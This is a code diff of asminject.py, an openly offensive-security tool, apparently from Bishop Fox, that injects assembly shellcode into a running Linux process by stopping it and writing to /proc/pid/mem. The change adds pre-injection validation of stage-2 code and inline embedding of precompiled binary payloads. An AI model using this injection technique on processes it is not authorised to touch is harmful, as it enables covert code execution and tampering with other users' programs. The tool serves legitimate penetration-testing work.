@@ -12,8 +12,8 @@ BANNER = r"""
         \/                   \/\______|    \/     \/     \/|__|   \/
 
 asminject.py
-v0.10
-Ben Lincoln, Bishop Fox, 2022-05-10
+v0.11
+Ben Lincoln, Bishop Fox, 2022-05-11
 https://github.com/BishopFox/asminject
 based on dlinject, which is Copyright (c) 2019 David Buchanan
 dlinject source: https://github.com/DavidBuchanan314/dlinject
@@ -109,7 +109,10 @@ class asminject_parameters:
         self.target_affinity = None
         self.target_process = None
         
+        self.shellcode_section_delimiter = "SHELLCODE_SECTION_DELIMITER"
         self.precompiled_shellcode_label = "precompiled_shellcode"
+        self.post_shellcode_label = "post_shellcode_section"
+        self.inline_shellcode_placeholder = "[VARIABLE:INLINE_SHELLCODE:VARIABLE]"
         
         self.enable_debugging_output = False
         
@@ -419,6 +422,94 @@ def asminject(injection_params):
         if not os.path.isfile(injection_params.precompiled_shellcode):
             log_error(f"Could not find the precompiled binary shellcode file '{injection_params.precompiled_shellcode}'", ansi=injection_params.ansi)
             sys.exit(1)
+    
+    library_bases = get_memory_map_data(injection_params)
+    library_names = []
+    for lname in library_bases.keys():
+        library_names.append(lname)
+    library_names.sort()
+    for lname in library_names:
+        log(f"{lname}: 0x{library_bases[lname]['base']:016x}", ansi=injection_params.ansi)
+
+    # Do basic setup first to perform a validation on the stage 2 code
+    # (Avoids injecting stage 1 only to have stage 2 fail)
+    communication_address = library_bases["[stack]"]["end"] + injection_params.communication_address_offset
+
+    stage2_replacements = injection_params.custom_replacements
+    # these values will stay the same even for the real assembly
+    
+    stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
+    #stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
+    #stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
+    stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
+    stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
+    stage2_replacements['[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]'] = f"{injection_params.read_write_block_size}"
+    #stage2_replacements['[VARIABLE:SHELLCODE_SECTION_DELIMITER:VARIABLE]'] = f"{injection_params.shellcode_section_delimiter}"
+    stage2_replacements['[VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.precompiled_shellcode_label}"
+    stage2_replacements['[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.post_shellcode_label}"
+    # these values are placeholders - real values will be determined by result of stage 1
+    stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_memory_restored}"
+    stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{injection_params.stage2_size}"
+    stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(communication_address-injection_params.stack_backup_size)}"
+    stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{communication_address}"
+    stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{communication_address}"
+    stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{communication_address}"
+
+    stage2_source_code = ""
+    shellcode_source_code = ""
+    try:
+        with open(stage2_template_source_path, "r") as asm_source_code_file:
+            stage2_source_code = asm_source_code_file.read()
+    except Exception as e:
+        log_error(f"Couldn't read the stage 2 template source code file '{stage2_template_source_path}': {e}", ansi=injection_params.ansi)
+        sys.exit(1)
+    
+    try:
+        with open(injection_params.asm_path, "r") as shellcode_source_code_file:
+            shellcode_source_code = shellcode_source_code_file.read()
+    except Exception as e:
+        log_error(f"Couldn't read the stage 2 template source code file '{injection_params.asm_path}': {e}", ansi=injection_params.ansi)
+        sys.exit(1)
+    
+    shellcode_source_code_split = shellcode_source_code.split(injection_params.shellcode_section_delimiter)
+    
+    stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_SOURCE:VARIABLE]', shellcode_source_code_split[0])
+    
+    shellcode_data_section = shellcode_source_code_split[1]
+
+    if injection_params.precompiled_shellcode:
+        try:
+            with open(injection_params.precompiled_shellcode, "rb") as precompiled_shellcode_file:
+                precompiled_payload = precompiled_shellcode_file.read()
+                precompiled_shellcode_as_hex = ""
+                for byte_num in range(0, len(precompiled_payload)):
+                    if byte_num == 0:
+                        precompiled_shellcode_as_hex = f"{hex(precompiled_payload[byte_num])}"
+                    else:
+                        precompiled_shellcode_as_hex = f"{precompiled_shellcode_as_hex}, {hex(precompiled_payload[byte_num])}"
+                
+                #shellcode_data_section = f"{shellcode_data_section}\n{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}"
+                shellcode_as_inline_bytes = f"{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}\n\n"
+                shellcode_data_section = shellcode_data_section.replace(injection_params.inline_shellcode_placeholder, shellcode_as_inline_bytes)
+                    
+        except Exception as e:
+            log_error(f"Couldn't read and embed the precompiled shellcode file '{injection_params.precompiled_shellcode}': {e}", ansi=injection_params.ansi)
+            sys.exit(1)
+
+    stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_DATA:VARIABLE]', shellcode_data_section)
+
+    log("Validating ability to assemble stage 2 code", ansi=injection_params.ansi)
+    stage2 = assemble(stage2_source_code, injection_params, library_bases, replacements=stage2_replacements)
+                           
+    if not stage2:
+        log_error(f"Validation assembly of stage 2 failed. Please verify that all required parameters and offset lists have been provided. Rerun with --debug for additional information.'", ansi=injection_params.ansi)
+        sys.exit(1)
+    log("Validation assembly of stage 2 succeeded", ansi=injection_params.ansi)
 
     if injection_params.stop_method == "sigstop":
         log("Sending SIGSTOP", ansi=injection_params.ansi)
@@ -428,7 +519,7 @@ def asminject(injection_params):
                 state = stat_file.read().split(" ")[2]
             if state in ["T", "t"]:
                 break
-            log("Waiting for process to stop...", ansi=injection_params.ansi)
+            log("Waiting for process to stop", ansi=injection_params.ansi)
             time.sleep(0.1)
     elif injection_params.stop_method == "cgroup_freeze":
         log(f"Freezing process {injection_params.pid} using directory {injection_params.freeze_dir}", ansi=injection_params.ansi)
@@ -495,21 +586,11 @@ def asminject(injection_params):
                 got_initial_syscall_data = True
         log(f"RIP: {hex(rip)}", ansi=injection_params.ansi)
         log(f"RSP: {hex(rsp)}", ansi=injection_params.ansi)
-
-        library_bases = get_memory_map_data(injection_params)
-        library_names = []
-        for lname in library_bases.keys():
-            library_names.append(lname)
-        library_names.sort()
-        for lname in library_names:
-            log(f"{lname}: 0x{library_bases[lname]['base']:016x}", ansi=injection_params.ansi)
-        
-        communication_address = library_bases["[stack]"]["end"] + injection_params.communication_address_offset
         
         if continue_executing:
             log(f"Using: 0x{injection_params.state_ready_for_shellcode_write:08x} for 'ready for shellcode write' state value", ansi=injection_params.ansi)
             log(f"Using: 0x{injection_params.state_shellcode_written:08x} for 'shellcode written' state value", ansi=injection_params.ansi)
-            log(f"Using: 0x{injection_params.state_ready_for_memory_restore:08x} for 'ready for memory restore' state value", ansi=injection_params.ansi)
+            #log(f"Using: 0x{injection_params.state_ready_for_memory_restore:08x} for 'ready for memory restore' state value", ansi=injection_params.ansi)
             
             stage1_replacements = {}
             stage1_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
@@ -530,6 +611,7 @@ def asminject(injection_params):
 
             if not stage1:
                 continue_executing = False
+                log_error("Assembly of stage 1 failed - will not attempt to inject into process", ansi=injection_params.ansi)
             else:
                 with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                     # back up the code we're about to overwrite
@@ -548,7 +630,8 @@ def asminject(injection_params):
                     
                     # Set the "memory restored" state variable to match the first 8 bytes of the backed up communications address data
                     injection_params.state_memory_restored = struct.unpack('I', communication_address_backup[0:4])[0]
-                    log(f"Will specify 0x{injection_params.state_shellcode_written:016x} @ 0x{communication_address:016x} as the 'memory restored' value", ansi=injection_params.ansi)
+                    #log(f"Will specify 0x{injection_params.state_shellcode_written:016x} @ 0x{communication_address:016x} as the 'memory restored' value", ansi=injection_params.ansi)
+                    log(f"Using: 0x{injection_params.state_ready_for_memory_restore:08x} for 'ready for memory restore' state value", ansi=injection_params.ansi)
 
                     # write the primary shellcode
                     mem.seek(rip)
@@ -586,21 +669,11 @@ def asminject(injection_params):
 
         if continue_executing:
             stage2 = None
-            
-            stage2_replacements = injection_params.custom_replacements
             stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{rip}"
             stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{rsp}"
             stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
-            stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
-            stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
-            stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
-            stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-injection_params.stack_backup_size)}"
-            stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
-            stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
             stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_memory_restored}"
-            stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
-            stage2_replacements['[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]'] = f"{injection_params.read_write_block_size}"
-            
+            stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-injection_params.stack_backup_size)}"
             current_state = wait_for_communication_state(injection_params.pid, communication_address, injection_params.state_ready_for_shellcode_write)
             stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address}"
             stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size + injection_params.existing_stack_backup_location_offset}"
@@ -608,40 +681,7 @@ def asminject(injection_params):
             stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size + injection_params.existing_stack_backup_location_size + injection_params.new_stack_size + injection_params.arbitrary_read_write_data_location_offset}"
             stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{current_state.read_write_address + injection_params.read_write_block_size - 8}"
             
-            stage2_source_code = ""
-            shellcode_source_code = ""
-            try:
-                with open(stage2_template_source_path, "r") as asm_source_code_file:
-                    stage2_source_code = asm_source_code_file.read()
-            except Exception as e:
-                log_error(f"Couldn't read the stage 2 template source code file '{stage2_template_source_path}': {e}", ansi=injection_params.ansi)
-                sys.exit(1)
             
-            try:
-                with open(injection_params.asm_path, "r") as shellcode_source_code_file:
-                    shellcode_source_code = shellcode_source_code_file.read()
-            except Exception as e:
-                log_error(f"Couldn't read the stage 2 template source code file '{injection_params.asm_path}': {e}", ansi=injection_params.ansi)
-                sys.exit(1)
-            
-            shellcode_source_code_split = shellcode_source_code.split("BEGIN_SHELLCODE_DATA")
-            
-            stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_SOURCE:VARIABLE]', shellcode_source_code_split[0])
-            shellcode_data_section = shellcode_source_code_split[1]
-            
-            if injection_params.precompiled_shellcode:
-                with open(injection_params.precompiled_shellcode, "rb") as precompiled_shellcode_file:
-                    precompiled_payload = precompiled_shellcode_file.read()
-                    precompiled_shellcode_as_hex = ""
-                    for byte_num in range(0, len(precompiled_payload)):
-                        if byte_num == 0:
-                            precompiled_shellcode_as_hex = f"0x{hex(precompiled_payload[byte_num])}"
-                        else:
-                            precompiled_shellcode_as_hex = f"{precompiled_shellcode_as_hex}, 0x{hex(precompiled_payload[byte_num])}"
-                    
-                    shellcode_data_section = f"{shellcode_data_section}\n:{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}{ascii_hex_shellcode}"
-
-            stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_DATA:VARIABLE]', shellcode_data_section)
 
             stage2 = assemble(stage2_source_code, injection_params, library_bases, replacements=stage2_replacements)
                 
@@ -743,7 +783,7 @@ if __name__ == "__main__":
         help="Prompt for input before resuming/unfreezing the target process")
     
     parser.add_argument("--precompiled", type=str, 
-        help="Path to a precompiled binary shellcode payload to embed and launch (requires use of e.g. precompiled.s)")
+        help="Path to a precompiled binary shellcode payload to embed and launch (requires use of execute_precompiled.s or execute_precompiled_threaded.s as the stage 2 payload)")
 
     parser.add_argument("--preserve-temp-files", type=str2bool, nargs='?',
         const=True, default=False,
